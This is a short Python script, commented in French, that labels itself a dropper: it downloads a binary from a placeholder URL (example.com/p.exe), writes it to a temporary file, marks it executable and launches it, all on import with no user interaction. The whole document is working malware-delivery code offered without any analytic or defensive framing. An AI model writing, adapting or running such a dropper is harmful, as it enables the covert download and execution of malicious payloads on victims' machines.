# Dropper — télécharge + exécute second stage
# deps: requests
import requests, tempfile, os, subprocess, sys

PAYLOAD_URL = "https://example.com/p.exe"
MAX_BYTES   = 50 * 1024 * 1024

def fetch(url: str) -> bytes:
    resp = requests.get(url, stream=True, timeout=15)
    resp.raise_for_status()
    chunks, total = [], 0
    for chunk in resp.iter_content(65536):
        total += len(chunk)
        if total > MAX_BYTES: raise ValueError("payload trop lourd")
        chunks.append(chunk)
    return b"".join(chunks)

def drop_and_run(data: bytes):
    suffix = ".exe" if sys.platform=="win32" else ""
    fd, path = tempfile.mkstemp(suffix=suffix)
    try:
        os.write(fd, data); os.close(fd); os.chmod(path, 0o700)
        subprocess.Popen([path], close_fds=True)
    except Exception: os.close(fd); raise

drop_and_run(fetch(PAYLOAD_URL))
    